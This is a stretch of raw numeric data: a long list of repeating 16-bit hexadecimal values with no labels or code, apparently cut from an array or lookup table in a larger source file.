0x0007, 0x0007, 0x0000, 0x0B36, 0x0000, 0x0000, 0x1FC1, 0x1FC1, 0x0B34, 0x0B0D, 0x0B0D, 0x0B35, 0x0B34, 0x0B35, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0B0D, 0x0B0D, 0x0B0E, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FD0, 0x1FD0, 0x0007, 0x0007, 0x0007, 0x1FD0, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0B63, 0x0B63, 0x0007, 0x0007, 0x0007, 0x0000, 0x0B66, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0B64, 0x1FBF, 0x1FBF, 0x0B65, 0x0B72, 0x0B72, 0x0007, 0x0007, 0x0007, 0x0000, 0x0B75, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0B73, 0x0B65, 0x0B65, 0x0B74, 0x0B73, 0x0B74, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0B65, 0x0B8A, 0x0B8A, 0x0007, 0x0007, 0x0007, 0x0000, 0x0B8D, 0x0000, 0x0000, 0x1FBF, 0x1FBF, 0x0B8B, 0x0B64, 0x0B64, 0x0B8C, 0x0B8B, 0x0B8C, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0B64, 0x0B64, 0x0B65, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x0BAE, 0x0BAE, 0x0007, 0x0007, 0x0007, 0x0000, 0x0BB1, 0x0000, 0x0000, 0x1FD1, 0x1FD1, 0x0BAF, 0x1FBC, 0x1FBC, 0x0BB0, 0x0BBD, 0x0BBD, 0x0007, 0x0007, 0x0007, 0x0000, 0x0BC0, 0x0000, 0x0000, 0x1FD1, 0x1FD1, 0x0BBE, 0x0BB0, 0x0BB0, 0x0BBF, 0x0BBE, 0x0BBF, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0BB0, 0x0BD5, 0x0BD5, 0x0007, 0x0007, 0x0007, 0x0000, 0x0BD8, 0x0000, 0x0000, 0x1FBC, 0x1FBC, 0x0BD6, 0x0BAF, 0x0BAF, 0x0BD7, 0x0BD6, 0x0BD7, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0BAF, 0x0BAF, 0x0BB0, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0BF3, 0x0BF3, 0x0007, 0x0007, 0x0007, 0x0000, 0x0BF6, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0BF4, 0x1FA1, 0x1FA1, 0x0BF5, 0x0C02, 0x0C02, 0x0007, 0x0007, 0x0007, 0x0000, 0x0C05, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0C03, 0x0BF5, 0x0BF5, 0x0C04, 0x0C03, 0x0C04, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0BF5, 0x0C1A, 0x0C1A, 0x0007, 0x0007, 0x0007, 0x0000, 0x0C1D, 0x0000, 0x0000, 0x1FA1, 0x1FA1, 0x0C1B, 0x0BF4, 0x0BF4, 0x0C1C, 0x0C1B, 0x0C1C, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0BF4, 0x0BF4, 0x0BF5, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FD2, 0x1FD2, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0CF8, 0x0CF8, 0x0007, 0x0007, 0x0007, 0x0000, 0x0CFB, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0CF9, 0x1FAB, 0x1FAB, 0x0CFA, 0x0D07, 0x0D07, 0x0007, 0x0007, 0x0007, 0x0000, 0x0D0A, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0D08, 0x0CFA, 0x0CFA, 0x0D09, 0x0D08, 0x0D09, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0CFA, 0x0D1F, 0x0D1F, 0x0007, 0x0007, 0x0007, 0x0000, 0x0D22, 0x0000, 0x0000, 0x1FAB, 0x1FAB, 0x0D20, 0x0CF9, 0x0CF9, 0x0D21, 0x0D20, 0x0D21, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0CF9, 0x0CF9, 0x0CFA, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FD3, 0x1FD3, 0x0007, 0x0007, 0x0007, 0x1FD3, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0D4F, 0x0D4F, 0x0007, 0x0007, 0x0007, 0x0000, 0x0D52, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0D50, 0x1FBA, 0x1FBA, 0x0D51, 0x0D5E, 0x0D5E, 0x0007, 0x0007, 0x0007, 0x0000, 0x0D61, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0D5F, 0x0D51, 0x0D51, 0x0D60, 0x0D5F, 0x0D60, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0D51, 0x0D76, 0x0D76, 0x0007, 0x0007, 0x0007, 0x0000, 0x0D79, 0x0000, 0x0000, 0x1FBA, 0x1FBA, 0x0D77, 0x0D50, 0x0D50, 0x0D78, 0x0D77, 0x0D78, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0D50, 0x0D50, 0x0D51, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FD4, 0x1FD4, 0x0007, 0x0007, 0x0007, 0x1FD4, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0DA6, 0x0DA6, 0x0007, 0x0007, 0x0007, 0x0000, 0x0DA9, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0DA7, 0x1FAE, 0x1FAE, 0x0DA8, 0x0DB5, 0x0DB5, 0x0007, 0x0007, 0x0007, 0x0000, 0x0DB8, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0DB6, 0x0DA8, 0x0DA8, 0x0DB7, 0x0DB6, 0x0DB7, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0DA8, 0x0DCD, 0x0DCD, 0x0007, 0x0007, 0x0007, 0x0000, 0x0DD0, 0x0000, 0x0000, 0x1FAE, 0x1FAE, 0x0DCE, 0x0DA7, 0x0DA7, 0x0DCF, 0x0DCE, 0x0DCF, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0DA7, 0x0DA7, 0x0DA8, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x0DF1, 0x0DF1, 0x0007, 0x0007, 0x0007, 0x0000, 0x0DF4, 0x0000, 0x0000, 0x1FD5, 0x1FD5, 0x0DF2, 0x1FB6, 0x1FB6, 0x0DF3, 0x0E00, 0x0E00, 0x0007, 0x0007, 0x0007, 0x0000, 0x0E03, 0x0000, 0x0000, 0x1FD5, 0x1FD5, 0x0E01, 0x0DF3, 0x0DF3, 0x0E02, 0x0E01, 0x0E02, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0DF3, 0x0E18, 0x0E18, 0x0007, 0x0007, 0x0007, 0x0000, 0x0E1B, 0x0000, 0x0000, 0x1FB6, 0x1FB6, 0x0E19, 0x0DF2, 0x0DF2, 0x0E1A, 0x0E19, 0x0E1A, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0DF2, 0x0DF2, 0x0DF3, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0E36, 0x0E36, 0x0007, 0x0007, 0x0007, 0x0000, 0x0E39, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0E37, 0x1FC5, 0x1FC5, 0x0E38, 0x0E45, 0x0E45, 0x0007, 0x0007, 0x0007, 0x0000, 0x0E48, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0E46, 0x0E38, 0x0E38, 0x0E47, 0x0E46, 0x0E47, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0E38, 0x0E5D, 0x0E5D, 0x0007, 0x0007, 0x0007, 0x0000, 0x0E60, 0x0000, 0x0000, 0x1FC5, 0x1FC5, 0x0E5E, 0x0E37, 0x0E37, 0x0E5F, 0x0E5E, 0x0E5F, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0E37, 0x0E37, 0x0E38, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FD6, 0x1FD6, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0F3B, 0x0F3B, 0x0007, 0x0007, 0x0007, 0x0000, 0x0F3E, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0F3C, 0x1FB3, 0x1FB3, 0x0F3D, 0x0F4A, 0x0F4A, 0x0007, 0x0007, 0x0007, 0x0000, 0x0F4D, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0F4B, 0x0F3D, 0x0F3D, 0x0F4C, 0x0F4B, 0x0F4C, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0F3D, 0x0F62, 0x0F62, 0x0007, 0x0007, 0x0007, 0x0000, 0x0F65, 0x0000, 0x0000, 0x1FB3, 0x1FB3, 0x0F63, 0x0F3C, 0x0F3C, 0x0F64, 0x0F63, 0x0F64, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0F3C, 0x0F3C, 0x0F3D, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x0F86, 0x0F86, 0x0007, 0x0007, 0x0007, 0x0000, 0x0F89, 0x0000, 0x0000, 0x1FD7, 0x1FD7, 0x0F87, 0x1F9A, 0x1F9A, 0x0F88, 0x0F95, 0x0F95, 0x0007, 0x0007, 0x0007, 0x0000, 0x0F98, 0x0000, 0x0000, 0x1FD7, 0x1FD7, 0x0F96, 0x0F88, 0x0F88, 0x0F97, 0x0F96, 0x0F97, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0F88, 0x0FAD, 0x0FAD, 0x0007, 0x0007, 0x0007, 0x0000, 0x0FB0, 0x0000, 0x0000, 0x1F9A, 0x1F9A, 0x0FAE, 0x0F87, 0x0F87, 0x0FAF, 0x0FAE, 0x0FAF, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0F87, 0x0F87, 0x0F88, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0FCB, 0x0FCB, 0x0007, 0x0007, 0x0007, 0x0000, 0x0FCE, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0FCC, 0x1FB0, 0x1FB0, 0x0FCD, 0x0FDA, 0x0FDA, 0x0007, 0x0007, 0x0007, 0x0000, 0x0FDD, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0FDB, 0x0FCD, 0x0FCD, 0x0FDC, 0x0FDB, 0x0FDC, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0FCD, 0x0FF2, 0x0FF2, 0x0007, 0x0007, 0x0007, 0x0000, 0x0FF5, 0x0000, 0x0000, 0x1FB0, 0x1FB0, 0x0FF3, 0x0FCC, 0x0FCC, 0x0FF4, 0x0FF3, 0x0FF4, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0FCC, 0x0FCC, 0x0FCD, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FD8, 0x1FD8, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x10D0, 0x10D0, 0x0007, 0x0007, 0x0007, 0x0000, 0x10D3, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x10D1, 0x1FA6, 0x1FA6, 0x10D2, 0x10DF, 0x10DF, 0x0007, 0x0007, 0x0007, 0x0000, 0x10E2, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x10E0, 0x10D2, 0x10D2, 0x10E1, 0x10E0, 0x10E1, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x10D2, 0x10F7, 0x10F7, 0x0007, 0x0007, 0x0007, 0x0000, 0x10FA, 0x0000, 0x0000, 0x1FA6, 0x1FA6, 0x10F8, 0x10D1, 0x10D1, 0x10F9, 0x10F8, 0x10F9, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x10D1, 0x10D1, 0x10D2, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x111B, 0x111B, 0x0007, 0x0007, 0x0007, 0x0000, 0x111E, 0x0000, 0x0000, 0x1FD9, 0x1FD9, 0x111C, 0x1FB1, 0x1FB1, 0x111D, 0x112A, 0x112A, 0x0007, 0x0007, 0x0007, 0x0000, 0x112D, 0x0000, 0x0000, 0x1FD9, 0x1FD9, 0x112B, 0x111D, 0x111D, 0x112C, 0x112B, 0x112C, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x111D, 0x1142, 0x1142, 0x0007, 0x0007, 0x0007, 0x0000, 0x1145, 0x0000, 0x0000, 0x1FB1, 0x1FB1, 0x1143, 0x111C, 0x111C, 0x1144, 0x1143, 0x1144, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x111C, 0x111C, 0x111D, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1160, 0x1160, 0x0007, 0x0007, 0x0007, 0x0000, 0x1163, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1161, 0x1FB8, 0x1FB8, 0x1162, 0x116F, 0x116F, 0x0007, 0x0007, 0x0007, 0x0000, 0x1172, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1170, 0x1162, 0x1162, 0x1171, 0x1170, 0x1171, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1162, 0x1187, 0x1187, 0x0007, 0x0007, 0x0007, 0x0000, 0x118A, 0x0000, 0x0000, 0x1FB8, 0x1FB8, 0x1188, 0x1161, 0x1161, 0x1189, 0x1188, 0x1189, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1161, 0x1161, 0x1162, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FDA, 0x1FDA, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1265, 0x1265, 0x0007, 0x0007, 0x0007, 0x0000, 0x1268, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1266, 0x1FAF, 0x1FAF, 0x1267, 0x1274, 0x1274, 0x0007, 0x0007, 0x0007, 0x0000, 0x1277, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1275, 0x1267, 0x1267, 0x1276, 0x1275, 0x1276, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1267, 0x128C, 0x128C, 0x0007, 0x0007, 0x0007, 0x0000, 0x128F, 0x0000, 0x0000, 0x1FAF, 0x1FAF, 0x128D, 0x1266, 0x1266, 0x128E, 0x128D, 0x128E, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1266, 0x1266, 0x1267, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FDB, 0x1FDB, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x136A, 0x136A, 0x0007, 0x0007, 0x0007, 0x0000, 0x136D, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x136B, 0x1FA7, 0x1FA7, 0x136C, 0x1379, 0x1379, 0x0007, 0x0007, 0x0007, 0x0000, 0x137C, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x137A, 0x136C, 0x136C, 0x137B, 0x137A, 0x137B, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x136C, 0x1391, 0x1391, 0x0007, 0x0007, 0x0007, 0x0000, 0x1394, 0x0000, 0x0000, 0x1FA7, 0x1FA7, 0x1392, 0x136B, 0x136B, 0x1393, 0x1392, 0x1393, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x136B, 0x136B, 0x136C, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x13B5, 0x13B5, 0x0007, 0x0007, 0x0007, 0x0000, 0x13B8, 0x0000, 0x0000, 0x1FDC, 0x1FDC, 0x13B6, 0x1FBD, 0x1FBD, 0x13B7, 0x13C4, 0x13C4, 0x0007, 0x0007, 0x0007, 0x0000, 0x13C7, 0x0000, 0x0000, 0x1FDC, 0x1FDC, 0x13C5, 0x13B7, 0x13B7, 0x13C6, 0x13C5, 0x13C6, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x13B7, 0x13DC, 0x13DC, 0x0007, 0x0007, 0x0007, 0x0000, 0x13DF, 0x0000, 0x0000, 0x1FBD, 0x1FBD, 0x13DD, 0x13B6, 0x13B6, 0x13DE, 0x13DD, 0x13DE, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x13B6, 0x13B6, 0x13B7, 0x0007, 0x0007, 0x0007, 0x1F99, 0x13FA, 0x13FA, 0x0007, 0x0007, 0x0007, 0x0000, 0x13FD, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x13FB, 0x1FC3, 0x1FC3, 0x13FC, 0x1409, 0x1409, 0x0007, 0x0007, 0x0007, 0x0000, 0x140C, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x140A, 0x13FC, 0x13FC, 0x140B, 0x140A, 0x140B, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x13FC, 0x1421, 0x1421, 0x0007, 0x0007, 0x0007, 0x0000, 0x1424, 0x0000, 0x0000, 0x1FC3, 0x1FC3, 0x1422, 0x13FB, 0x13FB, 0x1423, 0x1422, 0x1423, 0x0007, 0x0007, 0x0007, 0x0007, 